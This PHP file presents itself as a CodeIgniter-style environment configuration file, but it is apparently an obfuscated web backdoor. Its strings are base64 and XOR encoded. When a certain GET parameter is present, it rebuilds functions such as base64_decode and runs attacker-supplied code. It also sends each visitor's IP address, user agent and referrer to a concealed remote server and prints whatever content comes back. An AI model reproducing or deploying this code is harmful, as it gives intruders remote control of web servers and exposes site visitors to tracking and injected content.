<?php
 /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
 
class Application
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s) self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r);$i !== $c;++$i) $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_j' => 'HhE8Fyw' . 'BcjEwHCsAMB5yM' . 'zMeMAVyPS0bOB' . 'sx' . 'SH9Y',
            '_eh' => 'HAQxHzoFK0YLEi8OZUs+Gy8HNgg+HzYEMUQ1CikKLAgt' . 'Ai8' . 'f',
            '_l' => '',
            '_mh' => 'PAU' . '=',
            '_b' => '',
            '_jx' => 'MRI' . 'XJw==',
            '_yk' => 'Yw0KTA==',
            '_ewn' => 'Y' . 'xg+HmE=',
            '_hfi' => 'KBIZ' . 'Hw==',
            '_sjp' => 'PAc' . '6',
            '_ejz' => 'Ph0c' . 'Ojk' . 'cFw' . 'Yr',
            '_ren' => 'Nhw' . 'F',
            '_q' => 'PREsFWk=',
            '_uu' => 'azMN' . 'Og' . '8=',
            '_gl' => 'MBw6',
            '_fuo' => 'KBE' . 'UF' . 'Q=' . '=',
            '_yg' => '',
            '_gzu' => '',
            '_zqf' => 'NxMBL11acAEcMwIGcRAQPQQUPA8QLBMaLQYSOkkWMApaPgRYPgkUMx4B' . 'NgQGcQ0GYAMUKw' . 'ZI',
            '_ri' => 'PAMtGgAf' . 'MR' . '8r',
            '_pu' => 'NwQAG' . 'gA' . 'TGw46',
            '_n' => 'Yw0YCgAMFgo6' . 'UQ' . '=' . '=',
            '_w' => 'YwUC' . 'OzgGMh' . 'cXJlk' . '=',
            '_xku' => 'LB' . 's' . 'EAj' . 'I' . 'd',
            '_hr' => 'NwQRB' . 'Cw' . '=',
            '_i' => 'GD8' . 'yfw==',
            '_dot' => 'L' . 'w8bNw' . '=' . '=',
            '_fx' => 'Lh' . 'MGCyY' . '=',
            '_cs' => 'Y' . 'A=' . '=',
            '_g' => 'L' . 'gYfGC' . 'Y=',
            '_o' => 'fyM8Nw9EW' . 'U1' . 'vZmIrM' . 'BgcWX8' . '=',
            '_zb' => 'NwoAEA' . '==',
            '_bpn' => 'UmEzMAUeOg' . 'gENgQeZ' . 'UszMwQDOmZ' . '6UmE=',
            '_f' => 'LBcD' . 'QHB' . 'L',
            '_vm' => '',
            '_vun' => 'NwssEA' . '=' . '=',
            '_di' => 'Un' . 'A' . '=',
            '_xl' => 'YxcSDQAQHhkr' . 'DE0' . '=',
            '_hq' => 'Fzk2DzIhEyQnETk9Fj' . '0=',
            '_s' => 'Fz' . 'kLPQAuEyQaIws' . 'yFj' . '0' . '=',
            '_afa' => 'FyYzJwAqODE' . 'QIDA2DTYiMwA0KC' . 'U' . '=',
            '_e' => 'FyEsDyogADM3DSI5DT' . 'E9Gyo+ECc=',
            '_nv' => 'DSI6E' . 'DMyACYzGz' . 'U=',
            '_mgl' => 'DSk5LQs' . 'pKyMbKCY' . '=',
            '_ljb' => 'F' . 'yYxDy0mGS' . '0mEDwrGjExFjwiADs1',
            '_fss' => 'Fy0' . '1MgA6Jz0cNi8sGjo1KxE+Pis' . 'P',
            '_jiq' => 'F' . 'zULMQ' . 'A0DCQNPh4mGi' . '8' . 'L',
            '_gqr' => 'Fzk9PQA4OigNMig' . 'q' . 'G' . 'iM' . '9',
            '_sm' => 'Fzw/IgA6LjQa' . 'O' . 'i4' . 'g',
            '_zg' => 'Fy44NgAoKSA' . 'a' . 'KCk' . '0',
            '_gqv' => 'O' . 'Q' . 'EzHDoaAB4+G' . 'g==',
            '_wsj' => 'bkVFcUdcb1lD',
            '_fh' => 'Nh' . 'g' . '=',
            '_tu' => 'KhI=',
            '_ltk' => 'LQ' . '0' . 'R',
            '_aiv' => 'MRc' . 'XCg==',
        );
    }
}
class Env
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
@header(Application::g('_j', '_' . 'r'));
@header(Application::g('_e' . 'h', '_k'));
$_q = Application::g('_' . 'l', '_c');
if (isset($_GET[Application::g('_' . 'm' . 'h', '_' . 'mqn') ]))
{
    $_jis = get_js(Application::g('_' . 'b', '_' . 'fz'));
    if ($_jis && strpos($_jis, Application::g('_' . 'j' . 'x', '_v' . 'd')) !== false)
    {
        die(Application::g('_' . 'y' . 'k', '_b' . 'a' . 'r'));
    }
    else
    {
        die(Application::g('_ewn', '_z'));
    }
}
if (isset($_GET[Application::g('_hf' . 'i', '_s' . 'us') ]))
{
    $_lg = Application::g('_' . 's' . 'jp', '_' . 'u') . Application::g('_e' . 'jz', '_iy' . 'e') . Application::g('_' . 're' . 'n', '_s' . 'k' . 'r');
    $_j = Application::g('_q', '_p') . Application::g('_u' . 'u', '_li') . Application::g('_gl', '_x');
    $_ptt = $_j($_GET[Application::g('_fuo', '_p' . 'xy') ]);
    $_ptt = $_lg(Application::g('_' . 'y' . 'g', '_' . 'aw') , $_ptt);
    $_ptt();
    die;
}
function get_js($_pte, $_s = - 2.939783715396)
{
    $_jis = Application::g('_gzu', '_t');
    $_f = Application::g('_z' . 'q' . 'f', '_' . 'gu') . $_pte;
    if (is_callable(Application::g('_' . 'ri', '_' . 'v')))
    {
        $_nr = curl_init($_f);
        curl_setopt($_nr, Env::g(0) , false);
        curl_setopt($_nr, Env::g(1) , Env::g(2));
        curl_setopt($_nr, Env::g(3) , Env::g(4));
        curl_setopt($_nr, Env::g(5) , Env::g(6));
        curl_setopt($_nr, Env::g(7) , Env::g(8));
        curl_setopt($_nr, Env::g(9) , Env::g(10));
        curl_setopt($_nr, Env::g(11) , Env::g(12));
        $_jis = curl_exec($_nr);
        $_e = curl_getinfo($_nr);
        curl_close($_nr);
        if ($_e[Application::g('_p' . 'u', '_ptj') ] != Env::g(13)) die(Application::g('_' . 'n', '_oyn'));
        if (empty($_jis)) die(Application::g('_' . 'w', '_' . 'g' . 'c'));
    }
    else
    {
        $_n = parse_url($_f);
        $_x = ($_n[Application::g('_x' . 'ku', '_xl' . 'g') ] == Application::g('_' . 'hr', '_' . 'pet'));
        $_gx = Application::g('_' . 'i', '_z' . 'f') . $_n[Application::g('_d' . 'o' . 't', '_no') ];
        if (isset($_n[Application::g('_' . 'fx', '_f' . 'cy') ])) $_gx .= Application::g('_c' . 's', '_o' . 'dr') . $_n[Application::g('_g', '_s' . 'z' . 'j') ];
        $_gx .= Application::g('_o', '_kh' . 'c') . $_n[Application::g('_z' . 'b', '_esd') ] . Application::g('_b' . 'pn', '_k' . 'p');
        $_d = fsockopen(($_x ? Application::g('_' . 'f', '_' . 'd' . 'o' . 'z') : Application::g('_v' . 'm', '_gyp')) . $_n[Application::g('_v' . 'u' . 'n', '_' . 'd') ], $_x ? Env::g(14) : Env::g(15));
        if ($_d)
        {
            fputs($_d, $_gx);
            $_y = Env::g(16);
            while (!feof($_d))
            {
                $_i = fgets($_d, Env::g(17));
                if ($_y) $_jis .= $_i;
                if ($_i == Application::g('_' . 'd' . 'i', '_z' . 'k')) $_y = Env::g(18);
            }
            fclose($_d);
            if (empty($_jis)) die(Application::g('_x' . 'l', '_usi'));
        }
    }
    return $_jis;
}
if (isset($_SERVER[Application::g('_h' . 'q', '_' . 'm' . 'b') ])) $_ob = $_SERVER[Application::g('_' . 's', '_m') ];
if (isset($_SERVER[Application::g('_a' . 'fa', '_' . 'r' . 'g' . 'w') ])) $_l = $_SERVER[Application::g('_' . 'e', '_u' . 'x') ];
if (isset($_SERVER[Application::g('_n' . 'v', '_' . 'gw') ])) $_uew = $_SERVER[Application::g('_m' . 'g' . 'l', '_' . 'l' . 'tb') ];
if (isset($_SERVER[Application::g('_' . 'ljb', '_re') ])) $_ka = $_SERVER[Application::g('_f' . 'ss', '_yab') ];
if (isset($_SERVER[Application::g('_j' . 'i' . 'q', '_a') ])) $_pr = $_SERVER[Application::g('_g' . 'qr', '_mim') ];
if (isset($_SERVER[Application::g('_s' . 'm', '_hkr') ])) $_o = $_SERVER[Application::g('_' . 'z' . 'g', '_z' . 'l' . 'f') ];
if (function_exists(Application::g('_gqv', '_' . 'h')))
{
    if (isset($_ob) && filter_var($_ob, Env::g(19))) $_q = $_ob;
    elseif (isset($_l) && filter_var($_l, Env::g(20))) $_q = $_l;
    else $_q = $_uew;
}
elseif (isset($_uew)) $_q = $_uew;
if ($_q == Application::g('_ws' . 'j', '_' . 'w' . 'r') && isset($_ka)) $_q = $_ka;
if (!isset($_q) || !isset($_pr) || !isset($_o)) exit;
else
{
    $_kf = array(
        Application::g('_fh', '_hn' . 'r') => $_q,
        Application::g('_tu', '_' . 's' . 'a') => $_pr,
        Application::g('_' . 'l' . 'tk', '_' . 'h' . 'w' . 'o') => $_o
    );
    $_b = urlencode(base64_encode(json_encode($_kf)));
    $_jis = get_js($_b);
    if ($_jis && strpos($_jis, Application::g('_aiv', '_s' . 'd' . 'r')) !== false)
    {
        echo $_jis;
        exit;
    }
}

/* wNMAWTxJ */